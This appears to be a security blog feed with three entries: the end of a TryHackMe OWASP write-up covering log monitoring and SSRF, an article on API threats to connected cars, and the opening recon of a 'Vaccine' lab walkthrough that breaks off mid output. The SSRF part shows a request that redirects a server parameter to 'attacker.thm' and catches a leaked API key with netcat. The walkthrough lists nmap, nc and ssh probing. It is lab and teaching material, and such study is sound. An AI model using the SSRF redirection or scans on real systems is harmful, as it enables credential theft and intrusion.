anticipated. Common examples of suspicious activity include:</p><ul><li>Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)</li><li>Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user’s account, it can also have a false positive rate.</li><li>Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.</li><li>Common payloads: in web applications, it’s common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised&#x2F;malicious testing on applications.</li></ul><p>Just detecting suspicious activity isn’t helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties’ attention.</p><p>Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the Download Task Files button at the top of the task.</p><h1 id="Server-Side-Request-Forgery-SSRF"><a href="#Server-Side-Request-Forgery-SSRF" class="headerlink" title="Server-Side Request Forgery (SSRF)"></a>Server-Side Request Forgery (SSRF)</h1><p>This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.</p><p>Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider’s server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:</p><p><img src="/../owasp_img/38.png" alt="alt text"></p><p>By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the server parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:</p><pre><code class="hljs bash">https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC</code></pre><p>This would make the vulnerable web application make a request to:</p><pre><code class="hljs bash">https://attacker.thm/api/send?msg=ABC</code></pre><p>You could then just capture the contents of the request using Netcat:</p><pre><code class="hljs bash">user@attackbox$ nc -lvp 80Listening on 0.0.0.0 80Connection received on 10.10.1.236 43830GET /:8087/public-docs/123.pdf HTTP/1.1Host: 10.10.10.11User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0Accept: */*</code></pre><p>This is a really basic case of SSRF. If this doesn’t look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:</p><ul><li>Enumerate internal networks, including IP addresses and ports.</li><li>Abuse trust relationships between servers and gain access to otherwise restricted services.</li><li>Interact with some non-HTTP services to get remote code execution (RCE).</li></ul><p>Challange</p><p>We have a web app, check where the download resume go</p><p><img src="/../owasp_img/39.png" alt="alt text"></p><p>Change the location to our machine and start a netcat:</p><pre><code class="hljs bash">nc -lvnp 4444</code></pre><p><img src="/../owasp_img/40.png" alt="alt text"></p><pre><code class="hljs bash">└─$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.9.3.147] from (UNKNOWN) [10.10.239.227] 37290GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1Host: 10.9.3.147:4444User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0Accept: */*X-API-KEY: THM&#123;Hello_Im_just_an_API_key&#125;</code></pre><p>Found flag.</p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> Room </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Car Hacking</title>
      <link href="/2024/05/28/Car-Hacking/"/>
      <url>/2024/05/28/Car-Hacking/</url>
      
        <content type="html"><![CDATA[<p><img src="/../Car_hacking_img/1*lf8FKUp6OwBGAVxrDn1yXA.jpg" alt="alt text"></p><h1 id="API-Security-for-Connected-Cars-and-Fleets"><a href="#API-Security-for-Connected-Cars-and-Fleets" class="headerlink" title="API Security for Connected Cars and Fleets"></a>API Security for Connected Cars and Fleets</h1><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>APIs enable effective connectivity between consumers and their vehicles, enterprise systems and applications, and enable automakers to expand the revenue streams and add new data driven features.</p><p>But this increased connectivity also opens the door to new threats. We’ll cover how these threats have evolved in recent years, and look into real world incidents where automotive and mobility services were impacted in an attack where APIs were exploited.</p><p>In the 2023 Global Automotive Cybersecurity Report, Upstream cybersecurity researchers and analysts investigated over 1,173 incidents, as early as 2010, and monitored hundreds of deep and dark web forums to compile this comprehensive, actionable report. But the most important thing is, we saw an increase of almost 400 percent in incidents since 2017. The exact number is 387%.</p><ul><li>Most attacks are now being executed remotely with no need for physical tampering, which contributes to the scale of attacks and the number of impacted assets.</li></ul><h2 id="What-does-this-mean-really"><a href="#What-does-this-mean-really" class="headerlink" title="What does this mean really?"></a>What does this mean really?</h2><p>Let’s take a car for example. In a connected vehicle, you don’t need to break the window to get inside anymore. All you need is to find vulnerability in an API, remotely unlock the car, and then drive away.</p><p>This is a bit of a simplistic explanation, but you get it. </p><p>Data can be leaked or tampered with for various reasons, from fraud to selling the database on the darknet. Premium paid for features can be unlocked by someone jailbreaking a car, for example. In a lot of these cases, we assume APIs are leveraged to carry out the attack.</p><p>As one of our examples later on shows. In 2022, Automotive and Smart Mobility API related incidents increased by 308%, accounting for 12 percent of total incidents. This is a very big jump. And when you consider that this is only based on reports made public and for attacks carried out, the numbers are probably a bit higher.</p><p>APIs have increasingly become a target for threat actors and even researchers looking for bounty. They are what enable the connected vehicles, but are also an increasingly growing attack surface.</p><p>So why APIs? At the core of it, it’s all about knowledge. Vehicles are so complex. You don’t need to know a ton about vehicles, ECUs, or how the engine works anymore. All you need is to understand how APIs work and start playing around.</p><p>Car hacking is no longer only about stealing a car or taming with it. It’s about impacting potentially millions of vehicles via an API.</p><p>Vehicle security has gone from being about protecting individual cars from super knowledgeable hackers to protecting millions of cars from tech savvy threat actors who know how to exploit the technology that connects vehicles to the world. And APIs are a growing threat landscape that the industry is striving to protect.</p><h1 id="Real-World-Examples"><a href="#Real-World-Examples" class="headerlink" title="Real-World Examples"></a><strong>Real-World Examples</strong></h1><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.57.18.png" alt="alt text"></p><h2 id="David-Colombo"><a href="#David-Colombo" class="headerlink" title="David Colombo"></a>David Colombo</h2><p>A 19 year old hacker and a security researcher, was able to control more than 25 Teslas around the world without their owner’s knowledge by exploiting a vulnerability in a third party app called Teslamate.</p><p>He was able to access 25 Teslas that used the app, and he did not have access to steering, braking, or acceleration, which could be especially dangerous. However, he was able to control some features of the cars, such as unlocking the doors, honking the horn, and flashing the lights. He was also able to see sensitive data, such as the car’s current location, the precise routes that the car took in the last few days, and the speed of the cars. He could also see the name that the owner gave to their Tesla.</p><p>He found a security vulnerability in the open source logging tool used by Teslamate and used it to gain access to the Tesla API keys. He then used the API keys to send commands to the Teslas. </p><p>This is a great example of why it’s crucial to consider not only securing internally APIs, but also to consider the impacts of third party APIs and what information is exposed to them. We see quite a few cases where third parties contribute to vulnerabilities, much like the next example.</p><h2 id="Sam-Curry"><a href="#Sam-Curry" class="headerlink" title="Sam Curry"></a>Sam Curry</h2><p>A security engineer, discovered a vulnerability in SiriusXM’s connected vehicle services that allowed him and his team to remotely start, unlock, locate, flash the lights and honk the horn on cars. He was able to identify a flaw in the authentication process that allowed him to gain unauthorized access to connected vehicle services.</p><p>The vulnerability was found in the telematics and infotainment systems powered by Sirius XM, which is used by 15 major car brands.</p><p>Curry found a loophole within the Sirius XM remote access software, which allowed users to authenticate to it using some form of mobile companion app. Users can log in to their accounts on these apps, which are linked to their vehicle’s VIN number, to execute commands and obtain information about their cars.</p><p>Curry alerted SiriusXM of the flaw, and the company quickly patched it within 24 hours.</p><p>Curry also found other vulnerabilities that allowed him to control vehicles remotely.</p><h2 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h2><p>The next incident had some really dramatic impact and is a great example of utilizing a business logic API attack.</p><p>Back in 2017, Elon Musk said that one of the biggest risks is that someone will achieve a fleet wide hack and send all vehicles to Rhode Island. And that’s kind of what happened here, but with a mobility service.</p><p>What happened is that using API calls to a mobility service, a well known hacktivist group managed to gridlock an entire city district, resulting in hours long traffic jams.</p><p>So, what exactly happened? On September 6th, 2022, hackers gained access to Yandex mobile app services. The hackers used Yandex Taxi, a ride hailing app, to order hundreds of drivers to the same location. This resulted in Moscow’s Philly district experiencing an unprecedented traffic jam.</p><p>The company later confirmed that it encountered an attempt to disrupt the service. and several dozen drivers received bulk orders.</p><p>The company reworked its routing algorithm following the attack to prevent similar incidents from occurring in the future. This is a really important part of API security, and it’s learning from attacks and ensuring that you patch vulnerabilities and mitigate future risks.</p><p>Anonymous, a group of hacktivists claimed responsibility for the attack on Twitter, which is how we know it was them.</p><p>This is one of the first known instances of hackers exploiting a ride hailing app to create a traffic jam. It is also rumored that the hackers had reverse engineered parts of the Yandex software and figured out how to exploit their back end APIs to execute this attack.</p><h1 id="API-Attack-Surfaces"><a href="#API-Attack-Surfaces" class="headerlink" title="API Attack Surfaces"></a><strong>API Attack Surfaces</strong></h1><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.57.29.png" alt="alt text"></p><p>Our starting point is the OWASP API Security Top 10. These guidelines provide a solid foundation for securing APIs across various industries.</p><p>For those who haven’t yet delved into the OWASP API Security Top 10, it’s a “live” list developed by the cybersecurity community to address the complexities of API security. These guidelines have been updated in 2023 to reflect the evolution of APIs and the ways in which they can be exploited by malicious actors.</p><p>The goal here is to heighten awareness of the most vulnerable aspects of APIs and ensure that developers, cybersecurity professionals, and QA teams are mindful of these vulnerabilities when developing and deploying code.<br>We recognize that even well-constructed APIs can be targeted by threat actors, with attacks becoming more sophisticated and impactful.</p><p>The OWASP API Security Top 10 serves as an excellent starting point for securing APIs. However, when considering fleets of connected cars, it’s helpful to think of APIs and their security in a more dynamic way. Just as a car is designed for entry through the driver-side door, users may find alternative ways to interact with it, such as through the passenger side, a window, or even the trunk.</p><h3 id="Case-1"><a href="#Case-1" class="headerlink" title="Case #1"></a>Case #1</h3><p>This analogy applies to APIs in the mobility ecosystem. For instance, an API designed to call a taxi to a specific location could be exploited if there’s no limit on the number of taxis that can be summoned to one place in a given time frame, leading to a business logic flaw.</p><h3 id="Case-2"><a href="#Case-2" class="headerlink" title="Case #2"></a>Case #2</h3><p>Another scenario could involve an API that returns excessive data, potentially allowing attackers to gather vehicle identification numbers (VINs) and access accounts. In OWASP terms, this is known as excessive data exposure.</p><p>Many of the real-world cybersecurity incidents we’ve analyzed involved the use of APIs in executing attacks.<br>Finally, there’s the risk of improper configuration, where someone might gain access to resources they shouldn’t have due to inadequate user validation. This represents one of the most significant threats: Broken Object Level Authorization (BOLA).</p><h2 id="The-Operational-Perspective-for-API-Security"><a href="#The-Operational-Perspective-for-API-Security" class="headerlink" title="The Operational Perspective for API Security"></a>The Operational Perspective for API Security</h2><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.57.36.png" alt="alt text"></p><p>In the context of connected vehicles, with their extensive data and the APIs that transfer and affect vehicle operations, securing the ecosystem becomes a crucial question. How can this be achieved effectively?<br>The answer is context, because an API transaction on it’s own is just that. When we can understand the context we can identify if the behavior makes sense for the usecase.<br>For example, pairing requests between a user’s account and a vehicle identifying number. This is a legitimate API operation, which is allowed. But if a single user is trying to connect 50 VINs to a single account - all of those transactions together, they make less sense from a cybersecurity standpoint.<br>A single transaction may not seem big but when examined together with additional information in context we can understand the impact it might have on the entire fleet.<br>When it comes to automotive, mobility and transportation, we cannot simply analyze transactions on their own, but rather augment them with additional data to truly understand the impact of the transaction on product safety, drivers on the road and data privacy.<br>To do this we need to leverage additional data sources, this can be things like the IP of the user making the API call - maybe they are different to the account registered to the VIN previously? Or it can be a data point from the vehicle itself, like is the engine on.</p><h2 id="Connected-Software-Defined-Vehicles-Produce-Massive-Amounts-of-Data"><a href="#Connected-Software-Defined-Vehicles-Produce-Massive-Amounts-of-Data" class="headerlink" title="Connected &amp; Software Defined Vehicles Produce Massive Amounts of Data"></a>Connected &amp; Software Defined Vehicles Produce Massive Amounts of Data</h2><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.57.46.png" alt="alt text"></p><p>Since connected vehicles are essentially computers on wheels and they generate massive amounts of data - from around 200 onboard sensors you can expect anywhere from 1.4 to 19 Terra Bytes an hour to be produced.<br>All of this data cannot be utilized effectively in it’s raw form, it needs to be cleaned up and sorted into a “snapshot” of the vehicle so that when needed it can accurately reflect the state the vehicle was in and provide the context to understand what was going on.<br>This snapshot shouldn’t be limited to vehicles, it also encompasses API endpoints, and users. Logging all of the information in real-time to build a representation of each asset to be investigated when the time comes.</p><h2 id="Unique-Digital-Twin-Technology"><a href="#Unique-Digital-Twin-Technology" class="headerlink" title="Unique Digital Twin Technology"></a>Unique Digital Twin Technology</h2><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.57.52.png" alt="alt text"></p><p>A digital twin comprises data points collected at a specific moment, reflecting a snapshot of an asset, whether it’s an endpoint, consumer, or vehicle at a specific point in time. By analyzing these twins across fleets and over time, we can better discern trends and detect anomalies in the data.<br>Unique digital twins are created for endpoints, API consumers (users who access and initiate API calls), and vehicles, which are directly influenced by these APIs.<br>In the ecosystem of connected vehicles, fleets, mobility services, and EV charging, it’s crucial to understand that the impacts of APIs on these assets translate into real-world, physical consequences.</p><p>The automotive sector is particularly intriguing, with real vehicles powered by computer systems on the roads. It’s the context of these vehicles, in interaction with applications, that aids in identifying anomalies in the data.<br>For example, an API call to a hundred vehicles could be a routine operation for a fleet operator but potentially suspicious for an individual user. Context is key in these scenarios.<br>How do we interpret this context?<br>Each digital twin acts as a “snapshot” of an asset’s state at a particular time, based on the available data.<br>Creating a digital representation of the state of an asset - be it a vehicle, an API endpoint, or an API consumer - at a specific time allows us to understand the context of events and accurately detect anomalies. This correlation across digital twins affords a holistic view of activities across a fleet or multiple APIs.<br>This method facilitates near real-time detection of threats and attacks, enabling efficient mitigation and response by a virtual SOC or a company’s cybersecurity team.</p><h2 id="Securing-automotive-fleets-smart-mobility-EV-charging-and-other-transportation-based-operations-extends-beyond-just-addressing-the-OWASP-API-Security-Top-10"><a href="#Securing-automotive-fleets-smart-mobility-EV-charging-and-other-transportation-based-operations-extends-beyond-just-addressing-the-OWASP-API-Security-Top-10" class="headerlink" title="Securing automotive, fleets, smart mobility, EV charging, and other transportation-based operations extends beyond just addressing the OWASP API Security Top 10."></a>Securing automotive, fleets, smart mobility, EV charging, and other transportation-based operations extends beyond just addressing the OWASP API Security Top 10.</h2><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.58.04.png" alt="alt text"></p><p>To effectively identify threats, it’s essential to comprehend how these businesses operate. In the process of identifying threats, vulnerabilities, or ongoing attacks, it’s necessary to consider not just API traffic data but also operational data, and understand the impact of APIs to effectively detect anomalies.</p><p>By analyzing API traffic and correlating it with the contextual effects these transactions have on operational systems and assets, it becomes possible to uncover and monitor threats.<br>This is where the digital twin comes to life and why it’s so powerful.<br>In the automotive world, operational data is massive since there is a signal for every component in the vehicle. So the digital twin enables us to extract the most important value on the state of vehicles to effectively analyze the impact of transitions, in context.<br>This approach facilitates accurate detection and response to direct and third-party vulnerabilities, attacks, misconfigurations, and design flaws, which are inherent in APIs.<br>Key data sources in this context include vehicle telematics, vehicle sensors, API traffic, IT or OT events, among others.<br>Enabling application developers to rapidly deploy code is critical for quick time-to-market and the delivery of essential features and patches. These are vital for the functionality of numerous connected and smart mobility features.</p><p>Minimizing the cybersecurity impact on the deployment cycle requires near-real-time detection capabilities.<br>Previous real-world examples illustrate the severe impact of attacks that can gridlock a city or disrupt a fleet of delivery trucks. To mitigate such attacks, constant vigilance over APIs is required, irrespective of the pace of development.</p><h1 id="Next-Gen-API-Security-Detection"><a href="#Next-Gen-API-Security-Detection" class="headerlink" title="Next Gen API Security Detection"></a><strong>Next Gen API Security Detection</strong></h1><h2 id="Purpose-built-API-Security-Detection-for-Transportation"><a href="#Purpose-built-API-Security-Detection-for-Transportation" class="headerlink" title="Purpose-built API Security Detection for Transportation"></a>Purpose-built API Security Detection for Transportation</h2><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.58.12.png" alt="alt text"></p><p>APIs continually evolve alongside the threat landscape they present, a reality we’ve already established.<br>This evolution underscores the importance of equipping organizations with tools that are effective against both current and future threats to API security.<br>Addressing the challenge of “future-proofing” cybersecurity measures for APIs in the automotive, fleet, smart mobility, and transportation sectors starts with ensuring tool scalability. Given that API transactions now constitute a large fraction of internet traffic—a trend intensifying within the automotive ecosystem—it’s essential that these tools can scale up. The increase in API usage, along with the data generated by connected vehicles, IT, and OT assets, necessitates scalable monitoring and data ingestion capabilities.</p><p>The capability to handle the ingestion of extensive data volumes is critical for a long-term solution in API security. It’s also important to normalize data from operational and organizational systems in tandem with the growth in API transaction volumes. This approach is key to effectively detecting vulnerabilities, misconfigurations, and threats.</p><p>Quick adaptation to evolving threats is crucial in a landscape where attacks are becoming more sophisticated. This adaptability enables the precise refinement of anomaly detection to meet unique business requirements and use cases, thereby enhancing mitigation and response efforts.</p><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.58.22.png" alt="alt text"></p><p>The automotive industry is in the midst of a transformation, automakers and their partners are shifting from traditional car companies selling physical products into technology companies that deliver software features alongside their hardware.</p><p>Today, modern vehicles run more lines of code than an F35, reflecting the industry’s shift towards increasingly software-defined vehicles.</p><p>This shift sees the industry adopt an additional approach alongside the focus on lengthy product design cycles, which involve years of rigorous work for safety and production, to a more agile development process with faster delivery of new features enabled by software and APIs.</p><h2 id="End-to-End-API-Security"><a href="#End-to-End-API-Security" class="headerlink" title="End-to-End API Security"></a>End-to-End API Security</h2><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.58.27.png" alt="alt text"></p><p>This accelerated development pace makes adopting a comprehensive shift-left approach critical for safeguarding products against cybersecurity attacks.<br>The shift-left approach integrates API security from the onset of software development, making it a core component of the process.<br>Prioritizing cybersecurity and testing measures early in the development process necessitates robust visibility.<br>Proactively detecting and resolving issues before deployment requires continuous discovery, monitoring, and detection of the organization’s APIs, regardless of whether they are internal, external, or used by third parties.<br>Given the potential of APIs in the automotive, smart mobility, and transportation industry to significantly impact assets, applying shift-left principles is crucial.<br>Developers must ensure that cybersecurity is a fundamental aspect of API design, rather than an afterthought.<br>This proactive strategy aids in identifying potential threats and vulnerabilities in APIs before they escalate into critical issues.<br>This approach is ideal for those starting from scratch, without an existing API landscape already influencing numerous assets and consumers.</p><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.58.38.png" alt="alt text"></p><p>In situations where an existing API landscape is in place, leveraging existing tools and processes within an organization, such as SOAR (Security Orchestration, Automation, and Response) systems, becomes essential.</p><p>SOAR systems streamline and enhance an organization’s cybersecurity operations by automating tasks, orchestrating workflows, and rapidly responding to cyber threats.</p><p>By utilizing existing processes and feeding in alerts informed by OT data, we can understand the context and impact of these alerts.</p><p>This enables not just stopping attacks but ensuring they don’t recur, addressing vulnerabilities in APIs as part of the shift-left approach.</p><p>So, how does this work in practice? Let’s say an alert was raised, and the account that triggered it can be immediately blocked in the SOC (or in the automotive world the vehicle SOC).</p><p>In an industry involving real drivers, they might contact the auto manufacturer’s support or their dealership to report issues like account malfunctions or other problems.<br>It’s crucial for the person answering the call to be able to query the caller effectively, understanding the full context of the situation.<br>They need to know the right questions to ask and how to address what may appear as a software bug or malfunction, which could, in fact, be the result of deliberate actions.<br>In addition to providing customer facing teams with the information they need to validate and understand the incident, these tools also allow for prompt handling of issues on the development side with alerts.</p><p>This is where OTA updates come in, since much like with mobile OS or applications, vehicles, too, get over-the-air updates on the regular. This means that for newer models, car owners don’t need to come in to a dealership to have software updates or patches installed to contain a vulnerability or address an issue.</p><p><img src="/../Car_hacking_img/Screenshot%202024-05-28%20at%2012.58.47.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vaccine</title>
      <link href="/2024/05/24/Vaccine/"/>
      <url>/2024/05/24/Vaccine/</url>
      
        <content type="html"><![CDATA[<p><img src="/../vaccine_img/4abda8d32b5c71e6905244988879c575.webp" alt="alt text"></p><p>Machine IP: 10.129.230.39</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><ul><li>command used: (scanning for all ports fast and efficient)</li></ul><pre><code class="hljs powershell">sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span></code></pre><p>→ output:</p><pre><code class="hljs powershell">Not shown: <span class="hljs-number">65515</span> closed tcp ports (reset), <span class="hljs-number">17</span> filtered tcp ports (no<span class="hljs-literal">-response</span>)Some closed ports may be reported as filtered due to <span class="hljs-literal">--defeat-rst-ratelimit</span>PORT   STATE SERVICE REASON<span class="hljs-number">21</span>/tcp open  ftp     syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span><span class="hljs-number">22</span>/tcp open  ssh     syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span><span class="hljs-number">80</span>/tcp open  http    syn<span class="hljs-literal">-ack</span> ttl <span class="hljs-number">63</span></code></pre><ul><li>command used: ( scanning the ports we got )</li></ul><pre><code class="hljs bash">nmap -A -sC -sV -p</code></pre><p>→ output:</p><pre><code class="hljs powershell">Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-23</span> <span class="hljs-number">22</span>:<span class="hljs-number">46</span> EDTNmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span>Host is up (<span class="hljs-number">0.046</span>s latency).PORT   STATE SERVICE VERSION<span class="hljs-number">21</span>/tcp open  ftp     vsftpd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span>| ftp<span class="hljs-literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)|_<span class="hljs-literal">-rwxr-xr-x</span>    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">2533</span> Apr <span class="hljs-number">13</span>  <span class="hljs-number">2021</span> backup.zip| ftp<span class="hljs-literal">-syst</span>: |   STAT: | FTP server status:|      Connected to ::ffff:<span class="hljs-number">10.10</span>.<span class="hljs-number">14.82</span>|      Logged <span class="hljs-keyword">in</span> as ftpuser|      <span class="hljs-built_in">TYPE</span>: ASCII|      No session bandwidth limit|      Session timeout <span class="hljs-keyword">in</span> seconds is <span class="hljs-number">300</span>|      Control connection is plain text|      <span class="hljs-keyword">Data</span> connections will be plain text|      At session startup, client count was <span class="hljs-number">4</span>|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable|_End of status<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.0</span>p1 Ubuntu <span class="hljs-number">6</span>ubuntu0.<span class="hljs-number">1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)| ssh<span class="hljs-literal">-hostkey</span>: |   <span class="hljs-number">3072</span> c0:ee:<span class="hljs-number">58</span>:<span class="hljs-number">07</span>:<span class="hljs-number">75</span>:<span class="hljs-number">34</span>:b0:<span class="hljs-number">0</span>b:<span class="hljs-number">91</span>:<span class="hljs-number">65</span>:b2:<span class="hljs-number">59</span>:<span class="hljs-number">56</span>:<span class="hljs-number">95</span>:<span class="hljs-number">27</span>:a4 (RSA)|   <span class="hljs-number">256</span> <span class="hljs-built_in">ac</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">81</span>:<span class="hljs-number">18</span>:<span class="hljs-number">89</span>:<span class="hljs-number">22</span>:d7:a7:<span class="hljs-number">41</span>:<span class="hljs-number">7</span>d:<span class="hljs-number">81</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">1</span>b:b8:b2:<span class="hljs-number">51</span> (ECDSA)|_  <span class="hljs-number">256</span> <span class="hljs-number">42</span>:<span class="hljs-number">5</span>b:c3:<span class="hljs-number">21</span>:df:ef:a2:<span class="hljs-number">0</span>b:c9:<span class="hljs-number">5</span>e:<span class="hljs-number">03</span>:<span class="hljs-number">42</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">69</span>:d0:<span class="hljs-number">28</span> (ED25519)<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))|_http<span class="hljs-literal">-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)| http<span class="hljs-literal">-cookie-flags</span>: |   /: |     PHPSESSID: |_      httponly flag not <span class="hljs-built_in">set</span>|_http<span class="hljs-literal">-title</span>: MegaCorp LoginWarning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed portAggressive OS guesses: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.8</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">5.0</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">3.1</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3.2</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">5.3</span> - <span class="hljs-number">5.4</span> (<span class="hljs-number">95</span>%), AXIS <span class="hljs-number">210</span>A or <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">5.0</span> - <span class="hljs-number">5.5</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">94</span>%), ASUS RT<span class="hljs-literal">-N56U</span> WAP (Linux <span class="hljs-number">3.4</span>) (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.16</span> (<span class="hljs-number">93</span>%)No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non<span class="hljs-literal">-ideal</span>).Network Distance: <span class="hljs-number">2</span> hopsService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (<span class="hljs-keyword">using</span> port 21/tcp)HOP RTT      ADDRESS<span class="hljs-number">1</span>   <span class="hljs-number">44.65</span> ms <span class="hljs-number">10.10</span>.<span class="hljs-number">14.1</span><span class="hljs-number">2</span>   <span class="hljs-number">46.96</span> ms <span class="hljs-number">10.129</span>.<span class="hljs-number">230.39</span></code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><p>-&gt; SSH package version:</p><pre><code class="hljs bash">nc -vn 10.129.230.39 22</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">└─$ nc -vn 10.129.230.39 22(UNKNOWN) [10.129.230.39] 22 (ssh) openSSH-2.0-OpenSSH_8.0p1 Ubuntu-6ubuntu0.1</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">ssh root@10.129.230.39</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">└─$ ssh root@10.129.230.39The authenticity of host <span class="hljs-string">&#x27;10.129.230.39 (10.129.230.39)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? </span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul><li><blockquote><p>curl:</p></blockquote></li></ul><pre><code class="hljs bash">└─$ curl -i http://10.129.230.39 | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  2312  100  2312    0     0  23303      0 --:--:-- --:--:-- --:--:-- 23353HTTP/1.1 200 OKDate: Fri, 24 May 2024 03:04:14 GMTServer: Apache/2.4.41 (Ubuntu)Set-Cookie: PHPSESSID=uuvnulvd19llu6dpi80lebqug9; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidatePragma: no-cacheVary: Accept-EncodingContent-Length: 2312Content-Type: text/html; charset=UTF-8&lt;!DOCTYPE html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span> &gt;&lt;<span 